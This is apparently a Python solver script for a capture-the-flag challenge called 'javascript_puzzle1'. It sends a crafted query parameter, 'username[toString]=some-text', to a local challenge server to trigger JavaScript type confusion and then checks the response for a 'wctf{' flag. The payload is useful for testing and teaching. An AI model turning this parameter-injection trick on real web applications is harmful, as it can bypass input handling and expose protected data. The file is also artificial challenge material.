import os
import requests
import sys

BASE_CHAL_URL = os.getenv('BASE_CHAL_URL') or 'http://localhost:8000/'
if not BASE_CHAL_URL.endswith('/'):
    BASE_CHAL_URL += '/'

result = requests.get(BASE_CHAL_URL + '?username[toString]=some-text')

if 'wctf{' in result.text:
    print('javascript_puzzle1 solved!')
else:
    print('javascript_puzzle1 solver FAILED!')
    sys.exit(1)

